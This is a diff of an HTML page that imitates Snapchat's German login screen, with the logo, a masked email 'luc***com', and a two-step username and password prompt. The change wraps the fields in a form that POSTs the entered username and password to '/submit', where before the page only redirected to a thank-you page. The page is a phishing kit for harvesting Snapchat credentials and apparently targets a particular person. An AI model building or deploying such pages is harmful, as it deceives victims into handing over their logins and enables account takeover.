@@ -8,24 +8,26 @@
 </head>
 <body>
   <div class="login-container">
-    <div class="login-box" id="step1">
-      <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="logo" />
-      <h2>Logge dich bei<br />Snapchat ein</h2>
-      <label for="username">Nutzername oder E-Mail</label>
-      <input type="text" id="username" placeholder="" />
-      <button onclick="goToStep2()">Weiter</button>
-    </div>
+    <form action="/submit" method="POST">
+      <div class="login-box" id="step1">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="logo" />
+        <h2>Logge dich bei<br />Snapchat ein</h2>
+        <label for="username">Nutzername oder E-Mail</label>
+        <input type="text" id="username" name="username" required />
+        <button type="button" onclick="goToStep2()">Weiter</button>
+      </div>
 
-    <div class="login-box" id="step2" style="display: none;">
-      <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="logo" />
-      <h2>Passwort eingeben</h2>
-      <div class="email-mask">luc***com <a href="#" onclick="goToStep1()">Das bist nicht du?</a></div>
-      <label for="password">Passwort</label>
-      <input type="password" id="password" />
-      <button onclick="window.location.href='danke.html'">Weiter</button>
-    </div>
+      <div class="login-box" id="step2" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="logo" />
+        <h2>Passwort eingeben</h2>
+        <div class="email-mask">luc***com <a href="#" onclick="goToStep1()">Das bist nicht du?</a></div>
+        <label for="password">Passwort</label>
+        <input type="password" id="password" name="password" required />
+        <button type="submit">Weiter</button>
+      </div>
+    </form>
   </div>
+
   <script src="script.js"></script>
 </body>
 </html>
-
